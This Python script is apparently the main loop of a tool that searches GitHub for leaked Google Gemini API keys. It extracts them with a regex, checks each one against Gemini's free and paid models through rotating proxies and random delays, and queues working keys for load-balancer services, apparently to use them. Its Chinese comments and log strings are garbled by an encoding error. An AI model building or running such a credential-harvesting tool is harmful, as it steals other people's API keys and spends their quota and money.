import os
import random
import re
import sys
import time
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any

# æ·»åŠ é¡¹ç›®æ ¹ç›®å½•åˆ°æ¨¡å—æœç´¢è·¯å¾„
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)

import google.generativeai as genai
from google.api_core import exceptions as google_exceptions

from common.Logger import logger
from common.config import Config
from common.translations import get_translator
from common import state
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils
from utils.migration import KeyMigration
from utils.key_validator import key_validator

# è·å–ç¿»è¯‘å‡½æ•°
t = get_translator().t

# åˆ›å»ºGitHubå·¥å…·å®ä¾‹å’Œæ–‡ä»¶ç®¡ç†å™¨ï¼ˆä¼ é€’è®¤è¯æ¨¡å¼å’Œsession cookieï¼‰
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS, Config.GITHUB_AUTH_MODE, Config.GITHUB_SESSIONS)

# ç»Ÿè®¡ä¿¡æ¯
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}

def normalize_query(query: str) -> str:
    query = " ".join(query.split())

    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings = []
    language_parts = []
    filename_parts = []
    path_parts = []
    other_parts = []

    for part in parts:
        if part.startswith('"') and part.endswith('"'):
            quoted_strings.append(part)
        elif part.startswith('language:'):
            language_parts.append(part)
        elif part.startswith('filename:'):
            filename_parts.append(part)
        elif part.startswith('path:'):
            path_parts.append(part)
        elif part.strip():
            other_parts.append(part)

    normalized_parts = []
    normalized_parts.extend(sorted(quoted_strings))
    normalized_parts.extend(sorted(other_parts))
    normalized_parts.extend(sorted(language_parts))
    normalized_parts.extend(sorted(filename_parts))
    normalized_parts.extend(sorted(path_parts))

    return " ".join(normalized_parts)


def extract_keys_from_content(content: str) -> List[str]:
    pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
    return re.findall(pattern, content)


def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    """
    æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡å¤„ç†æ­¤item
    
    Returns:
        tuple: (should_skip, reason)
    """
    # æ£€æŸ¥å¢é‡æ‰«ææ—¶é—´
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except Exception as e:
            pass

    # æ£€æŸ¥SHAæ˜¯å¦å·²æ‰«æ
    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    # æ£€æŸ¥ä»“åº“å¹´é¾„
    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    # æ£€æŸ¥æ–‡æ¡£å’Œç¤ºä¾‹æ–‡ä»¶
    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item(item: Dict[str, Any]) -> int:
    """
    å¤„ç†å•ä¸ªGitHubæœç´¢ç»“æœitemï¼ˆå¼‚æ­¥éªŒè¯æ¨¡å¼ï¼‰
    
    Returns:
        int: æ‰¾åˆ°çš„å¯†é’¥æ•°é‡
    """
    delay = random.uniform(1, 4)
    file_url = item["html_url"]

    # ç®€åŒ–æ—¥å¿—è¾“å‡ºï¼Œåªæ˜¾ç¤ºå…³é”®ä¿¡æ¯
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(t('failed_fetch_content', file_url))
        return 0

    keys = extract_keys_from_content(content)

    # è¿‡æ»¤å ä½ç¬¦å¯†é’¥
    filtered_keys = []
    for key in keys:
        context_index = content.find(key)
        if context_index != -1:
            snippet = content[context_index:context_index + 45]
            if "..." in snippet or "YOUR_" in snippet.upper():
                continue
        filtered_keys.append(key)
    
    # å»é‡å¤„ç†
    keys = list(set(filtered_keys))

    if not keys:
        return 0

    logger.info(t('found_keys', len(keys)))

    # å°†æ‰€æœ‰å¯†é’¥æ·»åŠ åˆ°å¼‚æ­¥éªŒè¯é˜Ÿåˆ—
    for key in keys:
        key_validator.add_key(key, repo_name, file_path, file_url)
    
    logger.info(f"ğŸ“¥ å·²æ·»åŠ  {len(keys)} ä¸ªå¯†é’¥åˆ°éªŒè¯é˜Ÿåˆ—")

    return len(keys)


def validate_gemini_key(api_key: str) -> Union[bool, str]:
    try:
        time.sleep(random.uniform(0.5, 1.5))

        # è·å–éšæœºä»£ç†é…ç½®
        proxy_config = Config.get_random_proxy()
        
        client_options = {
            "api_endpoint": "generativelanguage.googleapis.com"
        }
        
        # å¦‚æœæœ‰ä»£ç†é…ç½®ï¼Œæ·»åŠ åˆ°client_optionsä¸­
        if proxy_config:
            os.environ['grpc_proxy'] = proxy_config.get('http')

        genai.configure(
            api_key=api_key,
            client_options=client_options,
        )

        model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
        response = model.generate_content("hi")
        return "ok"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
        return "not_authorized_key"
    except google_exceptions.TooManyRequests as e:
        return "rate_limited"
    except Exception as e:
        if "429" in str(e) or "rate limit" in str(e).lower() or "quota" in str(e).lower():
            return "rate_limited:429"
        elif "403" in str(e) or "SERVICE_DISABLED" in str(e) or "API has not been used" in str(e):
            return "disabled"
        else:
            return f"error:{e.__class__.__name__}"


def validate_paid_model_key(api_key: str) -> Union[bool, str]:
    """
    éªŒè¯å¯†é’¥æ˜¯å¦æ”¯æŒä»˜è´¹æ¨¡å‹
    
    Args:
        api_key: Gemini APIå¯†é’¥
        
    Returns:
        "ok" è¡¨ç¤ºä»˜è´¹æ¨¡å‹å¯ç”¨ï¼Œå…¶ä»–å­—ç¬¦ä¸²è¡¨ç¤ºéªŒè¯å¤±è´¥çš„åŸå› 
    """
    try:
        time.sleep(random.uniform(0.5, 1.5))

        # è·å–éšæœºä»£ç†é…ç½®
        proxy_config = Config.get_random_proxy()
        
        client_options = {
            "api_endpoint": "generativelanguage.googleapis.com"
        }
        
        # å¦‚æœæœ‰ä»£ç†é…ç½®ï¼Œæ·»åŠ åˆ°client_optionsä¸­
        if proxy_config:
            os.environ['grpc_proxy'] = proxy_config.get('http')

        genai.configure(
            api_key=api_key,
            client_options=client_options,
        )

        model = genai.GenerativeModel(Config.HAJIMI_PAID_MODEL)
        response = model.generate_content("hi")
        return "ok"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
        return "not_authorized_for_paid"
    except google_exceptions.TooManyRequests as e:
        return "rate_limited"
    except Exception as e:
        if "429" in str(e) or "rate limit" in str(e).lower() or "quota" in str(e).lower():
            return "rate_limited"
        elif "403" in str(e) or "SERVICE_DISABLED" in str(e) or "API has not been used" in str(e):
            return "disabled"
        elif "not found" in str(e).lower() or "404" in str(e):
            return "model_not_found"
        else:
            return f"error:{e.__class__.__name__}"


def print_skip_stats():
    """æ‰“å°è·³è¿‡ç»Ÿè®¡ä¿¡æ¯"""
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(t('skip_stats', total_skipped, skip_stats['time_filter'], skip_stats['sha_duplicate'], skip_stats['age_filter'], skip_stats['doc_filter']))


def reset_skip_stats():
    """é‡ç½®è·³è¿‡ç»Ÿè®¡"""
    global skip_stats
    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}


def main():
    start_time = datetime.now()

    # æ‰“å°ç³»ç»Ÿå¯åŠ¨ä¿¡æ¯
    logger.info("=" * 60)
    logger.info(t('system_starting'))
    logger.info("=" * 60)
    logger.info(t('started_at', start_time.strftime('%Y-%m-%d %H:%M:%S')))

    # 1. æ£€æŸ¥é…ç½®
    if not Config.check():
        logger.info(t('config_check_failed'))
        sys.exit(1)
    
    # 1.5. æ£€æŸ¥æ˜¯å¦éœ€è¦æ•°æ®è¿ç§»ï¼ˆä»æ–‡æœ¬æ–‡ä»¶è¿ç§»åˆ°æ•°æ®åº“ï¼‰
    if Config.STORAGE_TYPE == 'sql' and file_manager.db_manager:
        migration = KeyMigration(Config.DATA_PATH, file_manager.db_manager)
        if migration.check_need_migration():
            logger.info(t('migration_check_detected'))
            if migration.migrate():
                logger.info(t('migration_check_completed'))
            else:
                logger.error(t('migration_check_failed'))
                logger.info(t('migration_check_hint'))
                sys.exit(1)
        else:
            logger.info(t('migration_check_not_needed'))
    
    # 2. æ£€æŸ¥æ–‡ä»¶ç®¡ç†å™¨
    if not file_manager.check():
        logger.error(t('filemanager_check_failed'))
        sys.exit(1)

    # 2.5. æ˜¾ç¤ºSyncUtilsçŠ¶æ€å’Œé˜Ÿåˆ—ä¿¡æ¯
    if sync_utils.balancer_enabled:
        logger.info(t('syncutils_ready'))
        
    # æ˜¾ç¤ºé˜Ÿåˆ—çŠ¶æ€
    balancer_queue_count = len(checkpoint.wait_send_balancer)
    gpt_load_queue_count = len(checkpoint.wait_send_gpt_load)
    gpt_load_paid_queue_count = len(checkpoint.wait_send_gpt_load_paid)
    gpt_load_rate_limited_queue_count = len(checkpoint.wait_send_gpt_load_rate_limited)
    logger.info(t('queue_status', balancer_queue_count, gpt_load_queue_count))
    if gpt_load_paid_queue_count > 0:
        logger.info(f"ğŸ’ ä»˜è´¹å¯†é’¥é˜Ÿåˆ—: {gpt_load_paid_queue_count} ä¸ªå¾…å‘é€")
    if gpt_load_rate_limited_queue_count > 0:
        logger.info(f"â° 429å¯†é’¥é˜Ÿåˆ—: {gpt_load_rate_limited_queue_count} ä¸ªå¾…å‘é€")
    
    # æ˜¾ç¤ºå¼‚æ­¥éªŒè¯å™¨çŠ¶æ€
    logger.info(f"ğŸš€ å¼‚æ­¥å¯†é’¥éªŒè¯å™¨: å·²å¯åŠ¨ï¼Œå¹¶å‘æ•° = {key_validator.max_workers}")

    # 3. æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯
    search_queries = file_manager.get_search_queries()
    logger.info(t('system_information'))
    logger.info(t('github_tokens_count', len(Config.GITHUB_TOKENS)))
    logger.info(t('search_queries_count', len(search_queries)))
    logger.info(t('date_filter', Config.DATE_RANGE_DAYS))
    if Config.PROXY_LIST:
        logger.info(t('proxy_configured', len(Config.PROXY_LIST)))
    
    # æ˜¾ç¤ºå¼ºåˆ¶å†·å´é…ç½®
    if Config.parse_bool(Config.FORCED_COOLDOWN_ENABLED):
        per_query = f"{Config.FORCED_COOLDOWN_HOURS_PER_QUERY} å°æ—¶" if Config.FORCED_COOLDOWN_HOURS_PER_QUERY != "0" else "ç¦ç”¨"
        per_loop = f"{Config.FORCED_COOLDOWN_HOURS_PER_LOOP} å°æ—¶" if Config.FORCED_COOLDOWN_HOURS_PER_LOOP != "0" else "ç¦ç”¨"
        logger.info(t('forced_cooldown_status', per_query, per_loop))

    if checkpoint.last_scan_time:
        logger.info(t('checkpoint_found'))
        logger.info(t('last_scan', checkpoint.last_scan_time))
        logger.info(t('scanned_files', len(checkpoint.scanned_shas)))
        logger.info(t('processed_queries', len(checkpoint.processed_queries)))
    else:
        logger.info(t('no_checkpoint'))


    logger.info(t('system_ready'))
    logger.info("=" * 60)

    total_keys_found = 0
    total_rate_limited_keys = 0
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(t('loop_start', loop_count, datetime.now().strftime('%H:%M:%S')))

            # æ¸…ç©ºä¸Šä¸€è½®çš„å·²å¤„ç†æŸ¥è¯¢ï¼Œå‡†å¤‡æ–°ä¸€è½®æœç´¢
            if loop_count > 1:
                checkpoint.processed_queries.clear()
                file_manager.save_checkpoint(checkpoint)
                logger.info(t('cleared_queries'))

            query_count = 0
            loop_processed_files = 0
            reset_skip_stats()
            
            # é‡ç½®éªŒè¯å™¨ç»Ÿè®¡ï¼ˆæ¯è½®å¾ªç¯å¼€å§‹æ—¶ï¼‰
            key_validator.reset_stats()

            for i, q in enumerate(search_queries, 1):
                normalized_q = normalize_query(q)
                if normalized_q in checkpoint.processed_queries:
                    logger.info(t('skipping_query', q, i))
                    continue

                res = github_utils.search_for_keys(q)
                
                # æ ‡è®°æ˜¯å¦éœ€è¦å†·å´ï¼ˆé»˜è®¤éœ€è¦ï¼‰
                should_cooldown = True

                # æ£€æŸ¥æ˜¯å¦æ˜¯æŸ¥è¯¢è¯­æ³•é”™è¯¯ï¼Œå¦‚æœæ˜¯åˆ™è·³è¿‡ï¼ˆä¸è§¦å‘å†·å´ï¼‰
                if res and res.get("query_syntax_error"):
                    logger.warning(t('query_syntax_error_skip', q, i, len(search_queries)))
                    checkpoint.add_processed_query(normalized_q)
                    file_manager.save_checkpoint(checkpoint)
                    should_cooldown = False
                    continue

                if res and "items" in res:
                    items = res["items"]
                    if items:
                        query_valid_keys = 0
                        query_rate_limited_keys = 0
                        query_processed = 0

                        for item_index, item in enumerate(items, 1):

                            # æ¯20ä¸ªitemä¿å­˜checkpointå¹¶æ˜¾ç¤ºè¿›åº¦
                            if item_index % 20 == 0:
                                # è·å–å½“å‰éªŒè¯ç»Ÿè®¡
                                validator_stats = key_validator.get_stats()
                                logger.info(t('progress', item_index, len(items), q, validator_stats['valid_keys'], validator_stats['rate_limited_keys'], total_keys_found, total_rate_limited_keys))
                                file_manager.save_checkpoint(checkpoint)
                                file_manager.update_dynamic_filenames()
                                
                                # å®šæœŸåˆ·æ–°éªŒè¯ç»“æœ
                                valid_count, rate_limited_count, paid_count = key_validator.flush_results()
                                if valid_count > 0 or rate_limited_count > 0:
                                    logger.info(f"ğŸ’¾ åˆ·æ–°éªŒè¯ç»“æœ: æœ‰æ•ˆ {valid_count}, é™é€Ÿ {rate_limited_count}, ä»˜è´¹ {paid_count}")

                            # æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡æ­¤item
                            should_skip, skip_reason = should_skip_item(item, checkpoint)
                            if should_skip:
                                logger.info(t('skipping_item', item.get('path','').lower(), item_index, skip_reason))
                                continue

                            # å¤„ç†å•ä¸ªitemï¼ˆå°†å¯†é’¥æ·»åŠ åˆ°å¼‚æ­¥éªŒè¯é˜Ÿåˆ—ï¼‰
                            keys_found = process_item(item)
                            query_processed += 1

                            # è®°å½•å·²æ‰«æçš„SHA
                            sha = item.get("sha")
                            checkpoint.add_scanned_sha(sha)
                            
                            # å¦‚æœä½¿ç”¨æ•°æ®åº“å­˜å‚¨ï¼Œä¿å­˜SHAåˆ°æ•°æ®åº“ï¼ˆæ•°æ®åº“ä¼šè‡ªåŠ¨å»é‡ï¼‰
                            if Config.STORAGE_TYPE == 'sql':
                                repo_name = item.get("repository", {}).get("full_name", "")
                                file_manager.append_scanned_sha(sha, repo_name)

                            loop_processed_files += 1



                        # ç­‰å¾…å½“å‰æŸ¥è¯¢çš„æ‰€æœ‰å¯†é’¥éªŒè¯å®Œæˆ
                        logger.info(f"â³ æŸ¥è¯¢ {i}/{len(search_queries)} æœç´¢å®Œæˆï¼Œç­‰å¾…å¯†é’¥éªŒè¯...")
                        key_validator.wait_completion(timeout=300)  # æœ€å¤šç­‰å¾…5åˆ†é’Ÿ
                        
                        # åˆ·æ–°éªŒè¯ç»“æœå¹¶è·å–ç»Ÿè®¡
                        valid_count, rate_limited_count, paid_count = key_validator.flush_results()
                        query_valid_keys = valid_count
                        query_rate_limited_keys = rate_limited_count
                        
                        total_keys_found += query_valid_keys
                        total_rate_limited_keys += query_rate_limited_keys

                        if query_processed > 0:
                            logger.info(t('query_complete', i, len(search_queries), query_processed, query_valid_keys, query_rate_limited_keys))
                            if paid_count > 0:
                                logger.info(f"ğŸ’ æœ¬æ¬¡æŸ¥è¯¢å‘ç°ä»˜è´¹å¯†é’¥: {paid_count} ä¸ª")
                        else:
                            logger.info(t('query_all_skipped', i, len(search_queries)))

                        print_skip_stats()
                    else:
                        # æ— æœç´¢ç»“æœï¼Œè·³è¿‡å†·å´
                        should_cooldown = False
                        logger.info(t('query_no_items', i, len(search_queries)))
                        logger.info(f"â­ï¸  æ— æœç´¢ç»“æœï¼Œè·³è¿‡æœ¬æ¬¡æŸ¥è¯¢çš„å¼ºåˆ¶å†·å´")
                else:
                    # æŸ¥è¯¢å¤±è´¥ï¼Œè·³è¿‡å†·å´
                    should_cooldown = False
                    logger.warning(t('query_failed', i, len(search_queries)))
                    logger.info(f"â­ï¸  æŸ¥è¯¢å¤±è´¥ï¼Œè·³è¿‡æœ¬æ¬¡æŸ¥è¯¢çš„å¼ºåˆ¶å†·å´")

                checkpoint.add_processed_query(normalized_q)
                query_count += 1

                checkpoint.update_scan_time()
                file_manager.save_checkpoint(checkpoint)
                file_manager.update_dynamic_filenames()

                # å¼ºåˆ¶å†·å´ - æ¯ä¸ªæŸ¥è¯¢åï¼ˆåªæœ‰åœ¨æœ‰ç»“æœæ—¶æ‰å†·å´ï¼‰
                if Config.parse_bool(Config.FORCED_COOLDOWN_ENABLED) and should_cooldown:
                    cooldown_hours = Config.parse_cooldown_hours(Config.FORCED_COOLDOWN_HOURS_PER_QUERY)
                    if cooldown_hours > 0:
                        cooldown_seconds = cooldown_hours * 3600  # ä¿ç•™å°æ•°ï¼Œæ”¯æŒæ›´ç²¾ç¡®çš„æ—¶é—´
                        logger.info(t('forced_cooldown_query', cooldown_hours, int(cooldown_seconds)))
                        state.is_in_cooldown = True
                        
                        # åˆ†æ®µä¼‘çœ ï¼Œæ¯60ç§’è¾“å‡ºä¸€æ¬¡å‰©ä½™æ—¶é—´
                        remaining_seconds = cooldown_seconds
                        interval = 60  # æ¯60ç§’æ›´æ–°ä¸€æ¬¡
                        
                        while remaining_seconds > 0:
                            if remaining_seconds <= interval:
                                time.sleep(remaining_seconds)
                                remaining_seconds = 0
                            else:
                                time.sleep(interval)
                                remaining_seconds -= interval
                                remaining_hours = remaining_seconds / 3600
                                remaining_minutes = (remaining_seconds % 3600) / 60
                                logger.info(f"â„ï¸ å†·å´ä¸­... å‰©ä½™æ—¶é—´: {remaining_hours:.2f} å°æ—¶ ({int(remaining_minutes)} åˆ†é’Ÿ / {remaining_seconds} ç§’)")
                        
                        state.is_in_cooldown = False

                if query_count % 5 == 0:
                    logger.info(t('taking_break', query_count))
                    time.sleep(1)

            # ç­‰å¾…æœ¬è½®æ‰€æœ‰å¯†é’¥éªŒè¯å®Œæˆ
            logger.info(f"â³ å¾ªç¯ {loop_count} æœç´¢å®Œæˆï¼Œç­‰å¾…æ‰€æœ‰å¯†é’¥éªŒè¯å®Œæˆ...")
            key_validator.wait_completion(timeout=600)  # æœ€å¤šç­‰å¾…10åˆ†é’Ÿ
            
            # æœ€åä¸€æ¬¡åˆ·æ–°éªŒè¯ç»“æœ
            valid_count, rate_limited_count, paid_count = key_validator.flush_results()
            if valid_count > 0 or rate_limited_count > 0:
                logger.info(f"ğŸ’¾ æœ€ç»ˆåˆ·æ–°: æœ‰æ•ˆ {valid_count}, é™é€Ÿ {rate_limited_count}, ä»˜è´¹ {paid_count}")
            
            logger.info(t('loop_complete', loop_count, loop_processed_files, total_keys_found, total_rate_limited_keys))

            # SHAè‡ªåŠ¨æ¸…ç† - æ¯Nè½®å¾ªç¯åæ‰§è¡Œä¸€æ¬¡
            if Config.parse_bool(Config.SHA_CLEANUP_ENABLED) and Config.STORAGE_TYPE == 'sql' and file_manager.db_manager:
                if loop_count % Config.SHA_CLEANUP_INTERVAL_LOOPS == 0:
                    try:
                        logger.info(f"ğŸ—‘ï¸ å¼€å§‹æ¸…ç†è¶…è¿‡ {Config.SHA_CLEANUP_DAYS} å¤©çš„æ—§SHAè®°å½•...")
                        sha_count_before = file_manager.db_manager.get_scanned_shas_count()
                        deleted_count = file_manager.db_manager.clean_old_shas(Config.SHA_CLEANUP_DAYS)
                        sha_count_after = file_manager.db_manager.get_scanned_shas_count()
                        logger.info(f"ğŸ—‘ï¸ SHAæ¸…ç†å®Œæˆ: åˆ é™¤ {deleted_count} æ¡ï¼Œå‰©ä½™ {sha_count_after} æ¡ (ä¹‹å‰ {sha_count_before} æ¡)")
                    except Exception as e:
                        logger.error(f"SHAæ¸…ç†å¤±è´¥: {e}")

            # å¼ºåˆ¶å†·å´ - æ¯è½®å¾ªç¯å
            if Config.parse_bool(Config.FORCED_COOLDOWN_ENABLED):
                cooldown_hours = Config.parse_cooldown_hours(Config.FORCED_COOLDOWN_HOURS_PER_LOOP)
                if cooldown_hours > 0:
                    cooldown_seconds = cooldown_hours * 3600  # ä¿ç•™å°æ•°ï¼Œæ”¯æŒæ›´ç²¾ç¡®çš„æ—¶é—´
                    logger.info(t('forced_cooldown_loop', cooldown_hours, int(cooldown_seconds)))
                    state.is_in_cooldown = True
                    
                    # åˆ†æ®µä¼‘çœ ï¼Œæ¯60ç§’è¾“å‡ºä¸€æ¬¡å‰©ä½™æ—¶é—´
                    remaining_seconds = cooldown_seconds
                    interval = 60  # æ¯60ç§’æ›´æ–°ä¸€æ¬¡
                    
                    while remaining_seconds > 0:
                        if remaining_seconds <= interval:
                            time.sleep(remaining_seconds)
                            remaining_seconds = 0
                        else:
                            time.sleep(interval)
                            remaining_seconds -= interval
                            remaining_hours = remaining_seconds / 3600
                            remaining_minutes = (remaining_seconds % 3600) / 60
                            logger.info(f"â„ï¸ å†·å´ä¸­... å‰©ä½™æ—¶é—´: {remaining_hours:.2f} å°æ—¶ ({int(remaining_minutes)} åˆ†é’Ÿ / {remaining_seconds} ç§’)")
                    
                    state.is_in_cooldown = False
                else:
                    logger.info(t('sleeping'))
                    time.sleep(10)
            else:
                logger.info(t('sleeping'))
                time.sleep(10)

        except KeyboardInterrupt:
            logger.info(t('interrupted'))
            
            # ç­‰å¾…éªŒè¯å®Œæˆå¹¶åˆ·æ–°ç»“æœ
            logger.info("â³ ç­‰å¾…å‰©ä½™å¯†é’¥éªŒè¯å®Œæˆ...")
            key_validator.wait_completion(timeout=120)
            key_validator.flush_results()
            
            checkpoint.update_scan_time()
            file_manager.save_checkpoint(checkpoint)
            logger.info(t('final_stats', total_keys_found, total_rate_limited_keys))
            logger.info(t('shutting_down'))
            
            # å…³é—­éªŒè¯å™¨å’ŒåŒæ­¥å·¥å…·
            key_validator.shutdown()
            sync_utils.shutdown()
            break
        except Exception as e:
            logger.error(t('unexpected_error', e))
            traceback.print_exc()
            
            # åˆ·æ–°å½“å‰éªŒè¯ç»“æœ
            try:
                key_validator.flush_results()
            except:
                pass
            
            logger.info(t('continuing'))
            continue


if __name__ == "__main__":
    main()
